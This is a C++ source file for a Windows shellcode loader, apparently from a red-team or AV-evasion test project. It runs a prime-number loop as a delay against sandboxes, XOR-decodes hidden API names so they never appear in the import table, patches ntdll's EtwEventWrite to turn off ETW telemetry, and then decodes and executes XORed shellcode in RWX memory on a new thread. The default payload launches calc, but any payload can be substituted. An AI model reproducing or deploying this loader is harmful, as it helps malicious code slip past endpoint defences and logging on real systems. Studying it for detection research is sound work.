#include <windows.h>
#include <cstdio>
#include <vector>


// This function XORs the data array with the key array
// We mainly use it to decrypt at cruntime what is statically XORed
void my_xor(unsigned char data[], int size, const unsigned char key[], int key_size)
{
	for (int i = 0; i < size; i++)
	{
		data[i] = data[i] ^ key[i % key_size];
	}
}
// This function will xor the payload with the key in order to decrypt it
void decrypt_payload(unsigned char* payload, unsigned char* memory, unsigned int payload_size, const unsigned char xor_key)
{
    int j = 0;
    for (unsigned int i = 0; i < payload_size-1; i+=3)
    {
        memory[j] = payload[i] ^ xor_key;
        //std::cout <<  std::hex <<int(payload[i]);
        j++;
    }
    /*
    for (unsigned int i = 0; i < (payload_size-1)/3; i+=1){
        std::cout <<  std::hex <<int(payload[i]);
    }
    */
}
// This function patches the EtwEventWrite function to avoid ETW events
void patchEtw(char* ntdll_dll_obfuscated_function_name, char* EtwEventWrite_obfuscated_function_name)
{
	// Patch to apply
	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret

#if DEBUG
	printf("The patch for the EtwEventWrite function is located at %p\n", &patch);
	printf("Hit enter to continue\n");
	getchar();
#endif

	ULONG old_protect = 0;
	size_t patch_size = sizeof(patch);

	HANDLE hcurrent_process = GetCurrentProcess();

	// get the address of the EtwEventWrite function
	void* pEtwEventWrite = (void*) GetProcAddress(GetModuleHandleA((LPCSTR) ntdll_dll_obfuscated_function_name), (LPCSTR) EtwEventWrite_obfuscated_function_name);

#if DEBUG
	printf("The EtwEventWrite is loaded at %p\n", pEtwEventWrite);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// change the protection of the memory page containing the function
	VirtualProtectEx(hcurrent_process, pEtwEventWrite, patch_size, PAGE_EXECUTE_READWRITE, &old_protect);

#if DEBUG
	printf("Changed memory protection of EtwEventWrite function to PAGE_EXECUTE_READWRITE\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// write the patch
	memcpy(pEtwEventWrite, patch, patch_size);

#if DEBUG
	printf("Patch applied\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// restore the protection of the memory page containing the function
	VirtualProtectEx(hcurrent_process, pEtwEventWrite, patch_size, old_protect, &old_protect);
	FlushInstructionCache(hcurrent_process, pEtwEventWrite, patch_size);

#if DEBUG
	printf("Changed back memory protection of EtwEventWrite function to its old status\n");
	printf("Hit enter to continue\n");
	getchar();
#endif
}

int get_largest_prime_number(int end_number)
{
    std::vector<int> test_sequence {2};

    for (int start_number = 3; start_number <= end_number; start_number++)
    {
        bool is_prime = true;
        for (int n : test_sequence)
            if (start_number % n == 0 && start_number != n)
                is_prime = false;

        if (is_prime)
            test_sequence.push_back(start_number);
    }

    int largest_prime_number = test_sequence.back();

    test_sequence.clear();

#if DEBUG
    printf("Prime number computed : %d\n", largest_prime_number);
	printf("Hit enter to continue\n");
	getchar();
#endif

    return largest_prime_number;
}

int main()
{

#include "functions.hpp"

#ifdef SHELLCODE_PATH
#include SHELLCODE_PATH
#else
#include "../../src/shellcodes/xored_low_entropy_calc.hpp"
#endif

    // Step 1 : Calculate the largest prime number (before a specific number)
    // About 40 seconds on 11th Gen i5 4 Cores
#ifdef DELAY
	int end_number = DELAY;
#else
	int end_number = 500000;
#endif
    int largest_prime_number = get_largest_prime_number(end_number);

	// Step 2 : deobfuscate all the names
	my_xor(KERNEL32_dll_obfuscated_function_name, sizeof(KERNEL32_dll_obfuscated_function_name), KERNEL32_dll_key, sizeof(KERNEL32_dll_key));
	my_xor(CreateThread_obfuscated_function_name, sizeof(CreateThread_obfuscated_function_name), CreateThread_key, sizeof(CreateThread_key));
	my_xor(VirtualAlloc_obfuscated_function_name, sizeof(VirtualAlloc_obfuscated_function_name), VirtualAlloc_key, sizeof(VirtualAlloc_key));
	my_xor(EtwEventWrite_obfuscated_function_name, sizeof(EtwEventWrite_obfuscated_function_name), EtwEventWrite_key, sizeof(EtwEventWrite_key));
	my_xor(ntdll_dll_obfuscated_function_name, sizeof(ntdll_dll_obfuscated_function_name), ntdll_dll_key, sizeof(ntdll_dll_key));
	my_xor(WaitForSingleObject_obfuscated_function_name, sizeof(WaitForSingleObject_obfuscated_function_name), WaitForSingleObject_key, sizeof(WaitForSingleObject_key));

#if DEBUG
	printf("deobfuscated function names : %s (at %p), %s (at %p), %s (at %p), %s (at %p), %s (at %p), %s (at %p)\n",
		   CreateThread_obfuscated_function_name,
		   CreateThread_obfuscated_function_name,
		   VirtualAlloc_obfuscated_function_name,
		   VirtualAlloc_obfuscated_function_name,
		   WaitForSingleObject_obfuscated_function_name,
		   WaitForSingleObject_obfuscated_function_name,
		   KERNEL32_dll_obfuscated_function_name,
		   KERNEL32_dll_obfuscated_function_name,
		   EtwEventWrite_obfuscated_function_name,
		   EtwEventWrite_obfuscated_function_name,
		   ntdll_dll_obfuscated_function_name,
		   ntdll_dll_obfuscated_function_name);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 3 : patch the EtwEventWrite function
	patchEtw((char*) ntdll_dll_obfuscated_function_name, (char*) EtwEventWrite_obfuscated_function_name);

	// Step 4 : get pointers to the functions to use without leaving traces in the import table
	// get the handle to the kernel32.dll module
	HMODULE kernel32_dll = GetModuleHandleA((char*)KERNEL32_dll_obfuscated_function_name);

#if DEBUG
	printf("kernel32.dll handle : %p\n", kernel32_dll);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Get the addresses of the functions we want to call
	FARPROC CreateThread_address = GetProcAddress(kernel32_dll, (char*)CreateThread_obfuscated_function_name);
	FARPROC VirtualAlloc_address = GetProcAddress(kernel32_dll, (char*)VirtualAlloc_obfuscated_function_name);
	FARPROC WaitForSingleObject_address = GetProcAddress(kernel32_dll, (char*)WaitForSingleObject_obfuscated_function_name);

#if DEBUG
	printf("CreateThread address : %p\n", CreateThread_address);
	printf("VirtualAlloc address : %p\n", VirtualAlloc_address);
	printf("WaitForSingleObject address : %p\n", WaitForSingleObject_address);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Finally, let's get pointers to the functions we want to call
	typedef HANDLE (WINAPI* pCreateThread)(
			LPSECURITY_ATTRIBUTES   lpThreadAttributes,
			SIZE_T                  dwStackSize,
			LPTHREAD_START_ROUTINE  lpStartAddress,
			__drv_aliasesMem LPVOID lpParameter,
			DWORD                   dwCreationFlags,
			LPDWORD                 lpThreadId
	);

	typedef LPVOID (WINAPI* pVirtualAlloc)(
			LPVOID lpAddress,
			SIZE_T dwSize,
			DWORD  flAllocationType,
			DWORD  flProtect
	);

	typedef DWORD (WINAPI* pWaitForSingleObject)(
			HANDLE hHandle,
			DWORD  dwMilliseconds
	);

	auto CreateThread = (pCreateThread)CreateThread_address;
	auto VirtualAlloc = (pVirtualAlloc)VirtualAlloc_address;
	auto WaitForSingleObject = (pWaitForSingleObject)WaitForSingleObject_address;

#if DEBUG
	printf("Shellcode is located at %p\n", shellcode);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 5 : Allocate the memory
	void* memory = VirtualAlloc(nullptr,
								sizeof(shellcode)/3,
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);

	if (memory == nullptr)
	{
		return 1;
	}

#if DEBUG
	printf("Allocated memory at %p\n", memory);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 6 : Copy the encrypted shellcode to the allocated memory
	memcpy(memory,
		   shellcode,
		   sizeof(shellcode)/3);

#if DEBUG
	printf("Shellcode copied to memory\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 7 : Decrypt the payload
	//my_xor((unsigned char*) memory, sizeof(shellcode), key, sizeof(key));
    const unsigned char key = '\x54';
    decrypt_payload((unsigned char*) shellcode, (unsigned char*) memory, sizeof(shellcode), key);
#if DEBUG
	printf("Shellcode decrypted\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 8 : Create a thread pointing to the shellcode address
	HANDLE thread =	CreateThread(nullptr,
				 0,
				 (LPTHREAD_START_ROUTINE) memory,
				 nullptr,
				 0,
				 nullptr);

	if (thread == nullptr)
	{
		return 1;
	}

	// Wait for the thread to finish
	WaitForSingleObject(thread, INFINITE);

	return 0;
}
